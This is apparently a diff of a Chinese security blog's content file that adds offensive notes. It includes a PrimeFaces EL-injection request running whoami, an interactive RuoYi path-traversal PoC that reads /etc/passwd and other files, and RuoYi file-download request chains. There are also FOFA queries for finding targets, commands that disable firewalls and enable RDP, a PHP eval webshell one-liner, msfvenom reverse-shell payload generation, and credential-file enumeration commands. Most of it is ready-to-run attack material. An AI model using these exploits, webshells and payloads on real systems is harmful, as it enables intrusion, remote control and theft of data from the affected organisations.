+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8088</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1567</span><br><span class="line"></span><br><span class="line">pfdrt=sc&amp;ln=primefaces&amp;pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><h4 id="4-5任意文件读取"><a href="#4-5任意文件读取" class="headerlink" title="4.5任意文件读取"></a>4.5任意文件读取</h4><blockquote>
+<p>若依管理系统是基于SpringBoot的权限管理系统,登录后台后可以读取服务器上的任意文件</p>
+</blockquote>
+<p>影响范围</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RuoYi &lt; v4.5.1</span><br></pre></td></tr></table></figure>
+
+<p>fofa</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;若依-管理系统&quot;</span><br></pre></td></tr></table></figure>
+
+<p>利用</p>
+<p>登录后台后，访问url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>可以用bp抓包改变参数获取敏感文件</p>
+<p>poc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号 : PeiQi文库                                                     \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: RuoYi &lt; v4.5.1                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mCookie      &gt;&gt;&gt; JSESSIONID=xxxxxx                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mFile        &gt;&gt;&gt; /etc/passwd                                         \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url, Cookie</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/common/download/resource?resource=/profile/../../../../etc/passwd&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:Cookie</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 正在请求 &#123;&#125;//common/download/resource?resource=/profile/../../../../etc/passwd \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,成功读取 /etc/passwd \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                Filename = <span class="built_in">input</span>(<span class="string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> Filename == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                    sys.exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    POC_2(target_url, Cookie, Filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, Cookie, Filename</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/common/download/resource?resource=/profile/../../../../&#123;&#125;&quot;</span>.<span class="built_in">format</span>(Filename)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:Cookie</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    Cookie = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mCookie &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url, Cookie)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-7-6任意文件下载"><a href="#4-7-6任意文件下载" class="headerlink" title="4.7.6任意文件下载"></a>4.7.6任意文件下载</h4><blockquote>
 <p><a href="https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ">https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ</a></p>
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxx/RuoYi/upload/123.txt&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=xxxx.yaml;.zip HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxxx/RuoYi/upload&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=/profile/123.txt HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
+<h3 id="EPMM-未授权API-访问更改-CVE-2023-35078"><a href="#EPMM-未授权API-访问更改-CVE-2023-35078" class="headerlink" title="EPMM 未授权API 访问更改(CVE-2023-35078)"></a>EPMM 未授权API 访问更改(CVE-2023-35078)</h3><p>中发现了 CVE-2023-35078 远程未经身份验证的 API 访问漏洞。此漏洞影响所有受支持的版本 - 版本 11.4 发布 11.10、11.9 和 11.8。旧版本&#x2F;版本也面临风险。此漏洞使未经授权的远程（面向互联网）攻击者能够访问用户的个人身份信息并对服务器进行有限的更改。</p>
+<p>影响版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ivanti Endpoint Manager Mobile 11.10</span><br><span class="line">Ivanti Endpoint Manager Mobile 11.9</span><br><span class="line">Ivanti Endpoint Manager Mobile 11.8</span><br><span class="line">不受支持的旧版本也会受到影响</span><br></pre></td></tr></table></figure>
+
+<p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;967636089&quot;</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vchan-in/CVE-2023-35078-Exploit-POC</span><br></pre></td></tr></table></figure>
+
+<p>官方补丁</p>
+<p><a href="https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US">https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US</a></p>
+<p><a href="https://forums.ivanti.com/s/article/KB-Remote-unauthenticated-API-access-vulnerability-CVE-2023-35078">https://forums.ivanti.com/s/article/KB-Remote-unauthenticated-API-access-vulnerability-CVE-2023-35078</a></p>
 ]]></content>
       <tags>
         <tag>网络安全</tag>
@@ -732,10 +876,9 @@
 
 
 
-<h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">关闭防火墙和开启3389</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+<h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">关闭防火墙和开启3389</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找指定目录下指定文件名</span></span><br><span class="line"><span class="built_in">dir</span> C:\ /s /b | find <span class="string">&quot;example.txt&quot;</span></span><br><span class="line"><span class="comment">#bash写入一句话木马</span></span><br><span class="line"><span class="built_in">echo</span> ^&lt;? php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]); ?^&gt; &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> ^&lt;? php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);?^&gt; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
 
-<p>msf</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#生成payload</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=2333 -f py</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/qq_15131581/article/details/127452844</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#生成payload</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=2333 -f py</span><br><span class="line">生成elf木马</span><br><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=X.X.X.X LPORT=8888 -f elf &gt; mshell.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>proxychains安装</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">添加socks5  127.0.0.1 1080</span><br></pre></td></tr></table></figure>
@@ -748,21 +891,28 @@
 <p>docker</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入容器内部</span><br><span class="line">docker exec -it &lt;id&gt;   /bin/bash</span><br><span class="line"> #查看docker状态</span><br><span class="line">docker container ls    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#检测是否在docker中</span><br><span class="line"> # 是否存在此文件</span><br><span class="line"> ls -al /.dockerenv</span><br><span class="line"></span><br><span class="line"> # 在其中是否包含docker字符串</span><br><span class="line"> cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
 
+<h5 id="gtihub搜索语法"><a href="#gtihub搜索语法" class="headerlink" title="gtihub搜索语法:"></a>gtihub搜索语法:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in:name baidu       #标题搜索含有关键字baidu</span><br><span class="line">in:descripton baidu     #仓库描述搜索含有关键字</span><br><span class="line">in:readme baidu       #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 baidu      #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 baidu   #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 baidu      #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 baidu   #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 baidu      #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 baidu  #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 baidu  #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:name         #用户名搜素</span><br><span class="line">license:apache-2.0 baidu  #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java baidu     #在java语言的代码中搜索关键字</span><br><span class="line">user:baidu in:name baidu   #组合搜索,用户名baidu的标题含有baidu的</span><br></pre></td></tr></table></figure>
 
 
 
-
-<p>webrtc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">about:config，将media.peerconnection.enabled值改为false；</span><br></pre></td></tr></table></figure>
-
-
+<h5 id="webrtc"><a href="#webrtc" class="headerlink" title="webrtc"></a>webrtc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#火狐浏览器</span><br><span class="line">about:config，将media.peerconnection.enabled值改为false；</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;WebRTC泄露检测&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function findIP(onNewIP) &#123;</span><br><span class="line">        var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;</span><br><span class="line">        var pc = new myPeerConnection(&#123;iceServers: [&#123;urls: &quot;stun:stun.l.google.com:19302&quot;&#125;]&#125;),</span><br><span class="line">        noop = function() &#123;&#125;,</span><br><span class="line">        localIPs = &#123;&#125;,</span><br><span class="line">        ipRegex = /([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/g,</span><br><span class="line">        key;</span><br><span class="line"></span><br><span class="line">        function ipIterate(ip) &#123;</span><br><span class="line">          if (!localIPs[ip]) onNewIP(ip);</span><br><span class="line">          localIPs[ip] = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pc.createDataChannel(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        pc.createOffer(function(sdp) &#123;</span><br><span class="line">          sdp.sdp.split(&#x27;\n&#x27;).forEach(function(line) &#123;</span><br><span class="line">            if (line.indexOf(&#x27;candidate&#x27;) &lt; 0) return;</span><br><span class="line">            line.match(ipRegex).forEach(ipIterate);</span><br><span class="line">          &#125;);</span><br><span class="line">          pc.setLocalDescription(sdp, noop, noop);</span><br><span class="line">        &#125;, noop);</span><br><span class="line"></span><br><span class="line">        pc.onicecandidate = function(ice) &#123;</span><br><span class="line">          if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;</span><br><span class="line">          ice.candidate.candidate.match(ipRegex).forEach(ipIterate);</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function show(ip) &#123;</span><br><span class="line">        alert(ip);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      findIP(show);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>linux</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#乱码</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment">#切换账户到admin</span></span><br><span class="line">su -l admin </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户</span></span><br><span class="line">useradd   name  </span><br><span class="line">passwd   name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态网卡</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno</span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#关闭防火墙和临时禁用selinux安全模块</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment">#清空防火墙规则</span></span><br><span class="line">iptables -F</span><br><span class="line">获取内核，操作系统和设备信息</span><br><span class="line">版本信息</span><br><span class="line"><span class="built_in">uname</span> -a 所有版本</span><br><span class="line"><span class="built_in">uname</span> -r 内核版本信息</span><br><span class="line"><span class="built_in">uname</span> -n 系统主机名字</span><br><span class="line"><span class="built_in">uname</span> -m Linux内核架构</span><br><span class="line">内核信息 <span class="built_in">cat</span> /proc/version</span><br><span class="line">CPU信息 <span class="built_in">cat</span> /proc/cpuinfo</span><br><span class="line">发布信息</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line">主机名 hostname</span><br><span class="line">文件系统 <span class="built_in">df</span> -a</span><br><span class="line">内核日志 dmesg / /var/log/dmesg</span><br><span class="line">6.2.1.2. 用户和组</span><br><span class="line">列出系统所有用户 <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">列出系统所有组 <span class="built_in">cat</span> /etc/group</span><br><span class="line">列出所有用户<span class="built_in">hash</span>（root）``<span class="built_in">cat</span> /etc/shadow``</span><br><span class="line">用户</span><br><span class="line">查询用户的基本信息 finger</span><br><span class="line">当前登录的用户 <span class="built_in">users</span> <span class="built_in">who</span> -a /var/log/utmp</span><br><span class="line">查询无密码用户 grep <span class="string">&#x27;x:0:&#x27;</span> /etc/passwd</span><br><span class="line">目前登录的用户 w</span><br><span class="line">登入过的用户信息 last / /var/log/wtmp</span><br><span class="line">显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog</span><br><span class="line">登录成功日志 /var/log/secure</span><br><span class="line">登录失败日志 /var/log/faillog</span><br><span class="line">查看特权用户 grep :0 /etc/passwd</span><br><span class="line">查看passwd最后修改时间 <span class="built_in">ls</span> -l /etc/passwd</span><br><span class="line">查看是否存在空口令用户 awk -F: <span class="string">&#x27;length($2)==0 &#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看远程登录的账号 awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看具有sudo权限的用户</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line">6.2.1.3. 用户和权限信息</span><br><span class="line">当前用户 <span class="built_in">whoami</span></span><br><span class="line">当前用户信息 <span class="built_in">id</span></span><br><span class="line">可以使用sudo提升到root的用户（root） <span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">列出目前用户可执行与无法执行的指令 sudo -l</span><br><span class="line">6.2.1.4. 环境信息</span><br><span class="line">打印系统环境信息 <span class="built_in">env</span></span><br><span class="line">打印系统环境信息 <span class="built_in">set</span></span><br><span class="line">环境变量中的路径信息 <span class="built_in">echo</span>  <span class="variable">$PATH</span></span><br><span class="line">打印历史命令 <span class="built_in">history</span> / ~/.bash_history</span><br><span class="line">显示当前路径 <span class="built_in">pwd</span></span><br><span class="line">显示默认系统遍历 <span class="built_in">cat</span> /etc/profile</span><br><span class="line">显示可用的shell <span class="built_in">cat</span> /etc/shells</span><br><span class="line">6.2.1.5. 进程信息</span><br><span class="line">查看进程信息 ps aux</span><br><span class="line">资源占有情况 top -c</span><br><span class="line">查看进程关联文件 lsof -c <span class="variable">$PID</span></span><br><span class="line">完整命令行信息 /proc/<span class="variable">$PID</span>/cmdline</span><br><span class="line">进程的命令名 /proc/<span class="variable">$PID</span>/comm</span><br><span class="line">进程当前工作目录的符号链接 /proc/<span class="variable">$PID</span>/cwd</span><br><span class="line">运行程序的符号链接 /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">进程的环境变量 